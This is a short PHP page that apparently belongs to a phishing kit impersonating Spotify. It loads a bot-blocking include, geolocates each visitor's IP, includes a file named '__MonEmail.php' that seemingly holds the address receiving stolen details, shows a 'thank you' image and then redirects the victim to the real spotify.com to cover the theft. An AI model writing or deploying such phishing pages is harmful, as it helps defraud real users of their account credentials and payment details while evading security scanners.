<?php
include "./block-ip/bots.php";  
include "./block-ip/opciones.php";
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
session_start();
date_default_timezone_set("Africa/Morocco");
include('__MonEmail.php');
$rand = $_GET['dispatch'];
?>
<meta http-equiv="refresh" content="2; URL=https://spotify.com">
</head>

<body background="./img/thanky.png">






<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
</body></object></html>

